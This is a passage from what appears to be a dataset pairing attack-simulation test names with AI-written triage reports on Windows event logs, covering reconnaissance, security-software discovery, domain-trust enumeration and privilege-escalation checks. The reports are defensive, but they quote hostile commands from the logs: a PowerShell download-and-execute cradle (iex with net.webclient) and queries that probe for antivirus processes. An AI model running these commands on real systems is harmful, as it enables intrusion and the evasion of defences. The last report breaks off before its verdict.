**Resolution**: Based on the PowerShell utilization to conduct network scans, the log activity is classified as **SUSPICIOUS**. Further investigation is warranted to determine the legitimacy and origin of these operations, and to ensure no unauthorized actions are being executed which could precede a potential security breach."
Security Software Discovery,"Based on the log entries provided, here is a detailed analysis and assessment of potential malicious activity:

### Analysis

#### Windows System Log
- **Time Synchronization Events**: There are several time change events logged by the `Microsoft-Windows-Kernel-General`. The time synchronization entries involving `svchost.exe` with minimal time adjustment are benign as they reflect routine system operations.

#### Windows PowerShell Log
- **PowerShell Commands Executed**: The series of PowerShell commands executed (`Get-Process`, `Get-Service`, `Get-CimInstance`) appear to be querying information about system processes and services, specifically looking for 'Sysmon' related detail. While these actions could be part of normal monitoring or troubleshooting tasks, they can also be indicative of information-gathering actions by an intruder.

#### Sysmon Log
- **Sysmon Activity**: Notably detailed `Sysmon` logs capture a variety of processes related to typical system operations. The PowerShell-based commands interrogate service status (e.g., `powershell.exe /c Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }`), and multiple uses of `tasklist.exe` with filters like `virus`, `defender`, `cylance`, indicate someone is probing for specific security software status, likely to evade detection.

#### Application Log
- **Microsoft Edge Updates**: Logs show regular activity related to Microsoft Edge updates, showing Edge processes executing and typical update pathways. There are no overt signs of compromise or unusual behavior in this context.

#### Security Log
- **Time Change Logged by Security Auditing**: Similar to what was observed in the System Log, changes in system time are logged. This corroborates time-change entries seen by `svchost.exe` in the system logs and appears consistent with routine operations.

### Assessment

Based on the PowerShell and Sysmon logs:
- The use of PowerShell commands to query processes/services and extended logging activity around querying the state of known security services and tools are suspicious. These behaviors could be interpreted as reconnaissance efforts potentially related to lateral movement or privilege escalation attempts by someone with unauthorized access.

No direct indications of modifying processes or commands typically associated with malware execution (e.g., unusual file writes, suspicious network connections) were observed, which makes it challenging to conclusively determine the logs are malicious based on provided entries alone.

### Conclusion

Given the context provided, the activity within the logs is characterized as:
- **SUSPICIOUS**: The use of scripting to check for process and service information regarding security-related components, alongside numerous querying commands targeting firewall configurations and security tools, suggests suspicious activity that merits further investigation.

### Guidance on how to proceed:
1. **Further Investigation**: Conduct a thorough review of user access logs, system configurations, and network traffic logs to understand the source and context of these actions.
2. **Ensure Up-to-date Security Software**: Verify that security software is active and up-to-date to detect potential threats.
3. **Access Audit**: Check user accounts for unauthorized access, particularly around the time these logs were generated.
4. **Review Endpoint Configurations**: Ensure configurations are aligned with best security practices to prevent misuse.

Taking these actions can help validate any potential threats and mitigate risks."
System Time Discovery - PowerShell,"After thoroughly reviewing the provided event logs, I will summarize any notable points that indicate suspicious or potentially malicious activity.

1. **Application Log:**
   - There is a Software Protection Platform Service event but without additional context, it does not appear malicious.
   - The ""edgeupdate"" service is noted as stopped twice in a short period. While this isn't inherently suspicious, if unexpected, it may merit further investigation to ensure updates are not being tampered with.

2. **Sysmon Log:**
   - Frequent use of `wevtutil.exe` and `conhost.exe` by the `admin_test` user. `wevtutil.exe` is a legitimate Windows tool but is sometimes used by attackers to clear event logs. However, in the sequence shown, there are no subsequent logs indicating an attempt to clear logs, which suggests that these entries may be part of administrative activities.
   - Execution of standard utilities like `hostname.exe` and `whoami.exe` by the `admin_test` user.
   - Some use of PowerShell is observed with simple commands (e.g., `Get-Date`), which appears benign in this context but can be concerning if unusual commands were run. Regular monitoring of PowerShell usage is advisable.

3. **Security Log:**
   - The events in this log primarily focus on time changes and do not indicate any unauthorized access attempts or privilege escalation.

4. **System Log:**
   - Entries related to the Windows Kernel General and Time Service indicating time adjustments. This does not point to suspicious activity unless time changes were unexpected or unexplained.

5. **Windows PowerShell Log:**
   - The PowerShell execution appears to be part of regular administrative tasks, running simple commands. No directly suspicious activity noted here.

**Assessment:**

Based on the available log entries: 
- There is a pattern of administrative type activities with no clear signs of privilege escalation, exploitation, or data exfiltration.
- `wevtutil.exe` usage might deserve attention if its use wasn’t part of regular maintenance.
- While the logs do not show direct evidence of malicious activity, a review of policy regarding administrative access and log usage is recommended to ensure security protocols are being followed.

**Resolution: SUSPICIOUS**

The activity within the logs is categorized as SUSPICIOUS due to the use of `wevtutil.exe` and the stopping of the ""edgeupdate"" service. These could be benign but warrant a closer examination or correlation with user activity logs to confirm legitimacy or uncover misuse. Proceed by:
- Confirming if the activities align with expected administrative tasks.
- Reviewing user activity and group policies related to the described suspicious behaviors.
- Monitoring for any further unusual or unexpected activities to provide further evidence for clarification."
Windows Internal pktmon capture,"Upon analyzing the provided Windows event logs, the following points were detected as part of the investigation:

### Observations:

1. **frequent Execution of `wevtutil.exe` and `conhost.exe` Processes:**
   - Multiple instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` are executed by the user `SERVER002\admin_test`. While these are legitimate Windows processes, the high number of executions of `wevtutil.exe`, which is generally used for managing event logs, could be suspicious if not performed due to a legitimate administrative task.

2. **Use of `cmd.exe` with Packet Monitoring (`PktMon.exe`):**
   - The command execution of `cmd.exe` with `pktmon.exe start --etw -f %TEMP%\data.etl`, followed by a timeout and a stop command, suggests network traffic monitoring. The use of `pktmon.exe` could indicate a legitimate monitoring activity or potentially suspicious if performed without proper authorization or context.

3. **Execution of `whoami.exe`, `hostname.exe` Commands:**
   - Instances of `whoami.exe` and `hostname.exe` executed suggest that someone might be profiling the system or checking logged-on user information. Such behavior is typical for attackers after gaining an initial foothold to understand their environment.

4. **Edge Update and Installation:**
   - Installation processes for Microsoft Edge are observed, executed by `NT AUTHORITY\SYSTEM`. This behavior seems to be part of a regular update process by a legitimate Microsoft installer, indicating normal system behavior.

5. **Privileged Logons:**
   - The Security logs register logons with elevated privileges for user `admin_test`, including sensitive privileges such as `SeTakeOwnershipPrivilege` and `SeDebugPrivilege`. These could be legitimately used by an admin; however, if this user action was unauthorized, it might be indicative of privilege misuse or escalation.

6. **Logon Events:**
   - An `NTLM` authenticated logon type `3` (network logon) event was logged, which is a standard logon type for accessing shared folders or printers over the network, indicating a remote access attempt.

### Conclusion and Recommendation:

- **Resolution: SUSPICIOUS**
  - The Sysmon events suggest repeated use of utilities like `wevtutil.exe` and `pktmon.exe` which, while legitimate, are often leveraged by attackers for forensic evasion and traffic monitoring, respectively.
  - The execution of commands like `whoami` and use of administrative privileges indicate a scenario where inquisitive or adversarial actions could have taken place.
  - Without additional context or corroborating information justifying these activities, there is enough concern to classify these events as SUSPICIOUS. 

### Guidance:

1. **Further Investigation:**
   - Investigate the context of the user's activities, especially focusing on the reasons behind the repeated use of `wevtutil.exe` and traffic monitoring commands.
   - Confirm whether `admin_test` had legitimate reasons for executing these commands or if their credentials were compromised.

2. **Enhanced Monitoring:**
   - Implement positive security measures to monitor the activity of sensitive processes like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `pktmon.exe`.
   - Set alerts for unexpected or unauthorized changes to network monitoring tools.

3. **Review and Audit Credentials:**
   - Audit access logs and credentials for accounts with elevated privileges and ensure proper usage policies are enforced.
   - Consider rotating and strengthening credentials for critical accounts such as `admin_test`. 

These actions would help ascertain the legitimacy of these activities and prevent potential compromise."
Griffon Recon,"Upon analyzing the provided Windows event logs from the host named ""Server002,"" the following points summarize key observations and my assessment:

### Analysis:

1. **PowerShell Activities:**
   - Multiple PowerShell events (EventID: 600) indicate the execution of a script using `cscript.exe` to run a file named `griffon_recon.vbs` located in a temporary directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\`.
   - These PowerShell events are associated with a user `SERVER002\\admin_test`, and appear to run commands with administrative privileges (High integrity level), as depicted in the Sysmon logs.

2. **Sysmon Logs:**
   - Consistent logging of process creation, including PowerShell and conhost processes, without direct malicious indicators.
   - Notably, the execution of `cscript.exe` with `griffon_recon.vbs`, triggered by PowerShell, suggests potential reconnaissance activities by this script. This specific behavior stands out as potentially suspicious.
   - There are various legitimate processes related to Microsoft Edge updates and other standard operations that do not indicate malicious activity.

3. **Microsoft Edge Updates:**
   - Several processes related to `MicrosoftEdgeUpdate` depict routine update operations for Microsoft Edge, which are benign in nature.
   - Other operations include `MicrosoftEdgeUpdateSetup` and its related DLLs, which are part of routine update tasks for Edge and do not show signs of compromise.

4. **Defender Status:**
   - The Application log indicates that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), suggesting that the system's built-in antivirus is operational, providing a layer of protection.

### Assessment:
- The use of PowerShell to execute a script within a temporary directory, specifically named `griffon_recon.vbs`, is suspicious. The naming convention suggests potential reconnaissance activity, possibly to gather information about the system for further exploitation.
- The integration with cscript and the involvement of high-privilege execution signify actions that could be related to script-based attacks.
- While there is no definitive evidence of immediate harm (such as the launch of known malicious programs or connections to known bad IPs/domain names), the nature of script execution in this context mandates caution.

### Resolution:
- **Resolution: SUSPICIOUS**
  - The currently logged activity involving the execution of `griffon_recon.vbs` via PowerShell is suspicious. It warrants a deeper investigation to ascertain the script's intent and whether it is part of authorized administrative tasks or potential compromise.
  - Recommended actions include reviewing the content of `griffon_recon.vbs`, verifying the source and legitimacy of administrative scripts, and monitoring for any related network activities possibly indicating data exfiltration or lateral movement.

### Guidance:
- Conduct a detailed review of the script `griffon_recon.vbs` for any malicious or unauthorized code.
- Investigate the origin of the script and check whether its execution was scheduled or initiated by any legitimate administrative operation.
- Use network monitoring tools to check for suspicious outbound connections that might exploit reconnaissance data.
- Consider implementing stronger logging policies or employing threat detection tools that can give more context about script-based activities in real-time."
Windows - Discover domain trusts with nltest,"### Detailed Analysis:

The provided logs primarily contain entries from the Sysmon log, which is designed for advanced system monitoring on Windows to detect malicious activity. Here's a breakdown of events that may suggest suspicious or potentially malicious activity:

1. **CMD Execution and Process Creation**:
   - The execution of `cmd.exe` (EventID: 1, ProcessId: 1416) with command-line arguments `""cmd.exe"" /c WHERE nltest.exe` and later commands `nltest /domain_trusts & nltest /trusted_domains` indicates reconnaissance or exploration activities typically observed in network and domain information enumeration.
   - These commands are often used for network discovery, potentially by an attacker to understand the domain environment better, though in some environments, these could be legitimate actions taken by an administrator.

2. **Process Creation by Admin User**:
   - A majority of the processes, including `where.exe`, `hostname.exe`, and `whoami.exe`, spawn under the `SERVER002\\admin_test` user with high integrity level. While running such utilities by an administrator is not inherently malicious, the context and timing are crucial.
   - Consideration should be given if `SERVER002\\admin_test` is a legitimate user and if they were expected to conduct these tasks.
 
3. **High Process Creation Activity**:
   - Multiple instances of `wevtutil.exe`, a utility for manipulating event logs, are observed. This could point towards an attempt to clear or tamper with event logs, which is a tactic often employed by attackers to cover their tracks.
   
4. **Edge Update Process**:
   - The logs show extensive activity with processes related to `Microsoft Edge Update` (e.g., `MicrosoftEdgeUpdate.exe`, `Install/{0A9B7072-5742-48F4-A38F-0910BD39EA0F}/MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`). These activities primarily occur under `NT AUTHORITY\\SYSTEM`.
   - The Edge Update process includes commands like `/update`, `/regsvc`, `/regserver`, and `/ua`. Though such processes can be typical during software updates, they warrant scrutiny if such frequencies are unexplained or unexpected.

5. **Microsoft Edge Update Log Entries**:
   - The logs also show service stop events logged by `edgeupdate` in the application log. While this can be part of routine updates, unexplained frequency or timing may warrant further review.

### Threat Assessment:

Based on the gathered data, there’s sufficient indication to suspect possible reconnaissance activity potentially indicative of malicious intent:
- The enumeration utilities (`where`, `nltest`) being run could suggest network probing.
- Multiple entries for `wevtutil.exe` without clear justification can imply an effort to manipulate or cover activity in event logs.
- High-level administrative permissions are consistently used in executing these tools.

### Recommended Resolution:

**Resolution: SUSPICIOUS**

The logs hint at activities that may not fit the expected pattern for routine administrative tasks—specifically, the domain enumeration commands and potential manipulation of event logs using `wevtutil.exe`. It is advised to:
- Conduct further investigation to determine the legitimacy of the `admin_test` account and whether these tools should be used.
- Verify if any authorized script or user was meant to trigger these commands.
- Ensure that event logs remain intact and review other security logs for correlational evidence of malicious behavior.
- Consider implementing additional monitoring or alerts when reconnaissance tools like `nltest.exe` or utilities to manage event logs are executed. 

If any suspicious behavior is confirmed, isolate affected systems and conduct a deeper forensic investigation."
Permission Groups Discovery PowerShell (Local),"Upon reviewing the provided Windows event logs, several points of interest stand out:

1. **Time Change Events (EventID 4616 and 1):**
   - Multiple occurrences of time changes were observed wherein `svchost.exe` altered the system time. While this can be legitimate in the context of time synchronization services, frequent and unnecessary time changes by `svchost.exe` could be indicative of an attacker attempting to manipulate event timelines.
   - The security log entries indicate back and forth time modifications suggesting potential tampering.

2. **Privilege Events (Security ID 4672):**
   - The user `admin_test` was granted several high-level privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, etc. These are very powerful privileges that can be used for critical system changes or potential exploitation.
   - While this could indicate legitimate administrative actions, if `admin_test` is not a known administrator or if these actions weren't recorded as consistent with regular operations, they may be considered suspicious.

3. **Process Execution (Sysmon EventID 5, 1):**
   - Multiple executions of `wevtutil.exe`, `conhost.exe`, and other system utilities by `admin_test`. `wevtutil.exe` is typically used for managing event logs and could be used to clear logs or gather information, which is often used during post-compromise cleanup stages.
   - Similarly, excessive launching of `powershell.exe` performing administrative actions on groups such as retrieving or modifying local group memberships (`Get-LocalGroupMember -Name ""Administrators""`) is noted. This activity can be benign in terms of legitimate administrative task automation but is often utilized by attackers for reconnaissance or exploitation.

4. **Microsoft Edge Update Activity (Sysmon and Application logs):**
   - Numerous entries related to `MicrosoftEdgeUpdate.exe` and its components performing updates and installations are observed. While this is typically not suspicious as software updates are regular, large numbers of processes and logs generated without context could warrant a verification of update schedules or potential misuse.

5. **PowerShell Activity (Windows PowerShell Log):**
   - The script executed seems to revolve around capturing local group configurations. PowerShell as a tool is highly common in attack scenarios (living off the land), especially when enumerating or modifying users and system configurations.

### **Assessment:**
- The combination of frequent system time changes, privileged actions, and the execution of potentially sensitive system tool commands and scripts by an administrative user indicates suspicious activity.
- The behaviors observed are characteristic of activities that could relate to privilege escalation, lateral movement, or log manipulation conducted by a threat actor.

### **Resolution: SUSPICIOUS**

1. **Recommendations for Investigation:**
   - Verify if the actions by `admin_test` were authorized and correlates with legitimate administrative tasks.
   - Conduct a detailed user activity audit for `admin_test` to verify legitimacy and temporal context with respect to organization change controls.
   - Investigate or monitor the network activities and connections at the related timestamps, especially related to the IP address noted for `admin_test` logons.
   - Double-check the authenticity and schedule of the mentioned Microsoft Edge update processes.
   - Analyze any external log sources or security systems for potentially related alerts or anomalies.

2. **Further Action:**
   - If no legitimate context can be provided, escalate for an immediate internal security review and possible incident response actions.
   - If confirmed legitimate without anomaly, document for future reference but maintain heightened sensitivity to similar logs.

Given the lack of clarity without additional contextual information, a deeper investigative dive is essential before finalizing any conclusion as truly malicious."
Remote System Discovery - arp,"**Log Analysis Summary:**

After analyzing the provided Windows event logs, several points of interest and potential concern were noted. The key observations and analyses are detailed below:

### 1. Processes and Command Executions
- A quick succession of processes initiated by `SERVER002\admin_test` including `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe` executing `arp -a`, and `hostname.exe`. This behavior could be indicative of reconnaissance activities, as these utilities are often used to gather system information.
  
- Multiple `wevtutil.exe` processes have been run in sequence. Although `wevtutil.exe` is a legitimate utility used for managing and querying event logs, its usage might be leveraged by an attacker to clear logs or extract information covertly.

- The use of `cmd.exe` with the argument `arp -a` suggests that the user may have been attempting to map the network. While this can be a legitimate use case, it is also a known technique used by attackers for network reconnaissance.

  
### 2. Privilege Escalation
- Event ID 4672 indicates that `admin_test` received special privileges, including potentially dangerous rights such as `SeDebugPrivilege`, which is typically not required during regular user activities.
  
### 3. Pattern of Activity
- The logs show a rapid pattern of process creations and other activities which may be indicative of scripted activity rather than manual use. This fast execution of commands and tools is a red flag for automated scripts often used in attacks.

### 4. Time Synchronization Events
- There are events indicating time synchronization (`Event ID 4616`), which are normal on any Windows system but should be examined if they align with suspicious activity for possible anti-forensic measures.
  
### 5. Windows Updates and System Activity
- The logs show Windows Update activities and software installations related to Microsoft Edge, which appear legitimate.

### Conclusion:

Taking the analysis into account, I identify the nature of the logs as:

- **SUSPICIOUS** - The activity indicates potential preparations or attempts for further reconnaissance or compromise. Particularly, the sequence and nature of tasks performed by `admin_test` deviate from what would typically be expected for a legitimate user in that role.

### Recommendation:

Further investigation should be undertaken to determine the context of these events:

- **Review the justification** for the `admin_test` user running successive reconnaissance commands and determine if this aligns with legitimate administrative roles or tasks.
- **Check for anomalies** in network traffic around the same time window for any unauthorized access attempts or data exfiltration.
- **Verify system integrity** by scanning for malware or anomalies in system binaries and user accounts.
- **Audit log management settings** to ensure logs are not being tampered with or cleared unexpectedly.

The possibility of these being legitimate administrative actions cannot be ruled out without additional context, however, the suspicious nature of the activity suggests a prudent, in-depth review is necessary."
Security Software Discovery - powershell,"### Detailed Analysis

#### **PowerShell Logs**

1. **PowerShell Activity (EventIDs: 1043-1049, 1050)**
   - **Command Executed**: `powershell.exe & {get-process | ?{$_.Description -like ""*virus*""} get-process | ?{$_.Description -like ""*carbonblack*""} get-process | ?{$_.Description -like ""*defender*""} get-process | ?{$_.Description -like ""*cylance*""} get-process | ?{$_.Description -like ""*mc*""} get-process | ?{$_.ProcessName -like ""*mc*""} get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }}`
   - **Analysis**: The command attempts to list processes based on descriptions linked to antivirus solutions (e.g., ""virus"", ""carbonblack"", ""defender"", ""cylance"", ""mc"") and process names (e.g., ""mc"", ""Sysmon""). This behavior indicates an attempt to query running security-related processes, which is suspicious and often indicative of a reconnaissance step prior to potential attack vectors such as malware.

#### **System Logs**

1. **Time Change Events (EventID: 3570, 3573; Security EventID: 4616)**
   - **Description**: Time was changed from a future time, back to 21:23:07 UTC.
   - **Process Responsible**: `svchost.exe`
   - **Analysis**: Unexpected changes in system time, especially when reverting to a previous time setting, can be a tactic used to avoid time-based detection controls. However, the responsible process `svchost.exe` is a legitimate Windows process, making it less clear-cut as a malicious activity merely from these logs.

#### **Sysmon Logs**

1. **Process Executions (EventIDs involving PowerShell and EdgeUpdate)**
   - **Repeated Process**: `powershell.exe` instances aligning with PowerShell logs, indicating a pattern of activity around the suspicious command execution.
   - **Process Context**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` executed by `wsmprovhost.exe` (Windows Remote Management Provider Host), common for remote execution contexts.
   - **MicrosoftEdgeUpdate.exe Activity**: Multiple process executions related to Edge updates are benign given the user and command details align with typical update procedures.

#### **Security Logs**

- **Time Change Logs**: Align with system change logs, displaying consistent reporting of the time shift and reverting. The occurrence under `svchost.exe` suggests an authorized service action unless otherwise proven suspicious by context or additional indicators.

#### **Application Logs**

- **Edge Update Events**: Multiple service stop events coincide with the edgeupdate process actions, consistent with application updates.

### Assessment

#### Conclusion:
- **Suspicious Behavior** Detected in PowerShell: The explicit search for security and antivirus processes using PowerShell command lines likely denotes reconnaissance or premeditated actions aimed at preparing for further exploitation or obfuscation.
- **Time Change Events**: Unusual but lack further malicious context in these logs; could be part of legitimate, albeit misconfigured, service actions.
- **Process Patterns in Sysmon**: No direct malware process execution; Edge update processes are normal.

### Final Resolution:
- **SUSPICIOUS** - The PowerShell activity observed needs further investigation to rule out potential reconnaissance or preparation for an attack. The time change, while intriguing, is not independently indicative of malicious activity.

### Guidance:
- **Further Investigation**: Conduct a deeper review of additional logs surrounding the timeframe of the PowerShell activity, check for network logs for unexpected outbound communications, and ensure Endpoint Detection and Response (EDR) rule checks around process activities.
- **Mitigation**: Review system policies on PowerShell execution and implement additional script-logging measures to detect unauthorized attempts to query or manipulate system security posture."

Basic Permission Groups Discovery Windows (Local),"After analyzing the provided Windows event logs from the Windows host (Server002), here are the findings:

1. **Application log**: 
   - The entries related to the ""edgeupdate"" service stopping are not inherently suspicious, as these could be related to regular update processes. Similarly, the event from the ""Microsoft-Windows-Security-SPP"" provider indicates activity related to licensing or software protection rules, which is expected behavior.

2. **System log**:
   - The logs indicate normal operating system behavior, including updates related to Microsoft Defender Antivirus and benign changes in system time, which were corrected by the Windows Time Service. The use of ""svchost.exe"" in these operations is also expected.

3. **Sysmon log**:
   - The Sysmon events show multiple process creations and executions, particularly involving legitimate system utilities (e.g., `whoami.exe`, `conhost.exe`, `cmd.exe`, `net.exe`, `net1.exe`).
   - The process `C:\Windows\System32\cmd.exe` executed a command-line related to checking local groups, specifically Administrators, which is often used for privilege enumeration. This is somewhat suspicious without context.
   - Repeated invocation and processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) are seen, which might be legitimate updates unless further context shows they are unexpected or out of schedule.

4. **Security log**:
   - Event 4799 suggests an attempt to query or modify local group membership using `net1.exe`. This activity, initiated by the user `SERVER002\admin_test`, might indicate someone checking or manipulating group policies or privileges.
   - Events 4616 involve time changes, typically benign unless tied to malicious activity like anti-forensics tactics.

**Assessment**:
The logs show a mix of standard system activities and some potentially suspicious actions. The processes using `cmd.exe` to list local groups and subsequent queries with `net.exe`/`net1.exe` warrant a closer look because they may indicate privilege enumeration or lateral movement attempts, especially since there is an identified user context (`admin_test`). 

**Resolution**:
- **SUSPICIOUS**: Although there are no direct indicators of compromise or explicit malicious actions, the usage of command-line network tools within this context suggests it needs more investigation. It would be prudent to verify the legitimacy of user actions by confirming authorized user activities or examining network connection logs to check for unexpected access related to external systems.

**Guidance**:
- Verify the `admin_test` account’s recent activities to ensure they align with expected behavior.
- Conduct a search in the environment for additional indicators of lateral movement, such as abnormal logins, the creation of new accounts, or changes to group memberships.
- Consider employing more detailed logging or endpoint detection mechanisms to capture a broader range of suspicious activities going forward."
WinPwn - Powersploits privesc checks,"**Analysis of Provided Windows Event Logs**

**PowerShell Logs:**
The Windows PowerShell logs indicate a significant area of concern. There were several events where PowerShell was invoked using a command-line that includes downloading and executing a script from a remote source:

```
powershell.exe & {$script_repo='https://raw.githubusercontent.com/script'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')
```

- The use of `Invoke-Expression (iex)` with `new-object net.webclient` to download and execute a script hosted on the internet can be a clear indicator of a malicious activity. This is typically associated with tactics used for downloading payloads or malicious scripts.

**Sysmon Logs:**
- The Sysmon logs corroborate the PowerShell activity, identifying the execution of `powershell.exe` with similar command-line arguments suggesting unauthorized or suspicious behavior.
- Further, the logs show frequent execution of system utilities like `wevtutil.exe`, `conhost.exe`, and other command-line executions under the context of a user (`SERVER002\\admin_test`) which can be typical in cases of reconnaissance or privilege escalation activities. However, these in themselves are not profoundly indicative of compromise without corroborating evidence.

**Application Logs:**
- No explicitly suspicious activity is observable in the application logs apart from a consistent report that Windows Defender is on, which doesn't directly relate to the particular PowerShell and Sysmon activities.

**Conclusion and Recommendations:**
Based on the evidence of the PowerShell scripts being executed from an internet-hosted source, and reinforced by correlated activities captured in the Sysmon logs, there is a strong indication of potentially malicious behavior. The execution of external scripts without adequate controls or verification represents a significant risk factor.

**Resolution:** MALICIOUS

**Guidance:**
1. **Immediate Action:** Isolate the machine to prevent further lateral movement or exfiltration of data.
2. **Further Investigation:** Conduct a detailed analysis on the source and impact of the downloaded script. Check if other hosts in the network have exhibited similar behaviors.
3. **Remediation:**
   - Remove any unauthorized scripts or software identified.
   - Harden PowerShell usage policies, enforce script signing, and use constrained language mode where possible.
   - Enhance firewall and IDS/IPS configurations to detect and block similar patterns in the future.
4. **Monitoring and Awareness:** Enhance log monitoring for suspicious PowerShell and Sysmon activities and continue to educate users about the risks associated with external scripts.

5. **Patch Management:** Ensure all systems are updated with patches, particularly PowerShell and system utilities."
WinPwn - itm4nprivesc,"Upon reviewing the provided Windows event logs, here is a detailed analysis based on several categories:

### Analysis:

#### System Log:
- These logs primarily capture system-level changes, such as time synchronization and system state changes by svchost.exe. The minor time difference corrections between events and the use of svchost.exe for legitimate system operations do not appear suspicious or indicative of malicious activity.

#### Security Log:
- The security logs indicate legitimate operations, mostly involving the Local Service performing time changes. There are no obvious signs of unauthorized access or privilege use based on the presented User SIDs. The user `S-1-5-19` represents the Local Service account, an expected user for system activities.

#### Application Log:
- The logs indicate that Windows Defender is active and running, with no alerts related to malware detection or blocking attempts, contributing to a benign state of system protection.

#### Sysmon Log:
- Sysmon is logging typical events. However, `powershell.exe` being executed with the following suspicious command stands out:
  - ```""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), itm4nprivesc -noninteractive -consoleoutput}```
- This indicates an attempt to download and execute a script from an external source, potentially for privilege escalation (`itm4nprivesc` suggests a privilege escalation tool). This behavior is both anomalous and indicative of possible malicious intent.

#### Windows PowerShell Log:
- The presence of PowerShell executing scripts from an external source with obfuscated components like `iex(new-object net.webclient)...` signifies potentially malicious activity, aligning with tactics used in cyber attacks to run malicious code stealthily.

### Summary:
- Most logs (system, security, application) appear benign and indicative of normal operations.
- The execution of PowerShell to download and execute a script from an external URL is highly suspicious and potentially malicious, fitting patterns used in fileless malware or initial stages of a cyber attack.

### Conclusion:
These logs are determined to be **MALICIOUS** due to the PowerShell activity involving external script execution, indicative of command and control-like behaviors. 

### Guidance:
- Immediate investigation should be initiated regarding the PowerShell script, focusing on identifying the intent and impact on the system.
- Isolate the affected system, conduct a thorough malware scan.
- Check for other indicators of compromise across similar systems or network segments.
- Update security protocols and consider blocking the involved external site via network firewalls and host file updates to prevent further access."
Qakbot Recon,"### Detailed Analysis of the Logs

#### Review Summary
The logs provided span multiple Windows event categories, indicating a series of system activities that include process creations, logons, and system events. The overall behavior observed in the logs can be categorized into two main areas of interest: logon activities and process executions.

#### Suspicious or Anomalous Behavior
1. **Unusual Logon Activity**: 
   - Two logons (Event ID 4624) are noted for the account `admin_test` from IP addresses in a particular range (e.g., `fe80::e3b5:5371:12a8:9c77` and `192.168.0.102`). These are network logons (Logon Type 3), which may warrant further examination, especially since they are accompanied by Event ID 4672 indicating special privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.).
   - The IP sources should be verified against allowed and expected ranges or devices.
   
2. **High Privilege Process Executions**: 
   - The `admin_test` account executes commands and utilities using processes such as `wevtutil.exe`, `cmd.exe`, and `net.exe`, often leveraging command-line tools like `whoami`, `nslookup`, `arp`, and `ipconfig` which can be indicative of reconnaissance activities or script-run commands.
   - The `cmd.exe` is invoked to run a batch script (`script.bat`) from a temporary directory, which is typically associated with scripted or potentially automated actions.

3. **Potential Reconnaissance Activities**:
   - Network and system reconnaissance tools (`net`, `arp`, `ipconfig`, `route`, `netstat`), and queries indicative of enumeration are executed, which could suggest either administrative tasks or exploration of network settings.

4. **Software Updates and Installers Activity**:
   - Multiple executables related to the Microsoft Edge installer are executed which align with legitimate update activities. However, the processes’ legitimacy should be confirmed through sources or signatures to rule out possible masquerading threats.

#### Threat/Risk Identification
- The special privileges associated with the logins and the subsequent execution of reconnaissance-like commands indicate higher risks for unauthorized exploration or potential compromise.
- Execution of tools that could enumerate network configurations or access levels might suggest post-exploitation activities if confirmed to be unauthorized sessions.

### Final Assessment
While there are activities consistent with normal administrative behavior, the context and execution sequence raises flags regarding potential malicious intent. Specifically:

- **Indicators of compromise (IOCs)** involving the combination of high privileges and network command executions could warrant further forensic analysis.
- Automated tools/scripts running from temporary directories often suggest scripted executions or tasks that should be verified against expected operations.

### Resolution
**SUSPICIOUS**

#### Guidance on How to Proceed
- **Verification of Logon Sources**: Ensure the IP addresses associated with these logon sessions are from known and trusted devices or sources. Check against any known whitelist or previously validated activity.
- **Confirm Administrative Actions**: Validate whether `admin_test` actions were expected and in line with regular administrative tasks.
- **Audit Privilege Use**: Confirm whether the granted privileges were necessary for the tasks being performed. This can help ascertain the legitimacy of the behavior.
- **Further Logging and Monitoring**: Enhance logging and monitoring of this and similar privileged accounts to catch any further unauthorized activities early.
- **Review of Script/Bat File**: Investigate the script executed to understand its purpose and verify it is not performing unauthorized actions.

The identified anomalies should lead to further investigation to ensure security integrity is maintained."
Automated AD Recon (ADRecon),"After a thorough review of the provided logs from the Windows host, here is the analysis:

### Security Log Analysis

1. **Event ID 4624 (Logon) and Event ID 4672 (Special Privileges Assigned):**
   - These events indicate a successful logon with special privileges, such as `SeTcbPrivilege`, `SeDebugPrivilege`, and others. These privileges are typically associated with SYSTEM or highly privileged accounts, which is normal for system processes.
   - The repetitive logon entries showing `LogonType` 5 mean a service logon, and it's logical for the `SYSTEM` and `SERVER002$` user since they represent system and network service accounts.

2. **Event ID 5379 (Credential Validation):**
   - A significant number of these events are logged, all with a `ReturnCode` of `3221226021` (STATUS_LOGON_FAILURE), targeting the ""MicrosoftAccount:user=02txoixylodcstop"". This seems like failed attempts to validate credentials against a Microsoft account, which could potentially be a misconfigured system or an indication of an attempt to validate an account improperly. Further verification is needed to determine the legitimacy of this activity.

3. **Event ID 4798 (Enumerate Local Group Memberships):**
   - Queries are being made to check user group memberships for accounts like `Administrator`, `admin_test`, etc., using `taskhostw.exe`. This is more on the side of an administrative query or could indicate lateral movement attempts.

### PowerShell Log Analysis

- The execution of a PowerShell script from a temp location: `Invoke-Expression ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.ps1""` suggests potentially suspicious activity. Temporary directories and `Invoke-Expression` usage are common vectors for executing code with potentially malicious intent.

### Sysmon Log Analysis

- PowerShell and command-line utilities such as `whoami.exe`, `wevtutil.exe`, and others are executed by the user `admin_test`. These activities might suggest an investigation into the system or possibly malicious intent if the operations performed were unexpected or unauthorized.

### Application Log Analysis

- No explicit suspicious activities are noted within the provided application log entries. The entries related to the Windows Defender being in a powered-on state are reassuring from a security posture standpoint. Edge and other update services show regular update and installation activities.

### Overall Assessment

**Threats/Risks Identified:**
- The execution of PowerShell scripts from a temporary directory suggests potential injection or execution of unauthorized scripts.
- Numerous credential validation failures explicitly involving Microsoft account logons.
- Enumeration of user group memberships through `taskhostw.exe`.

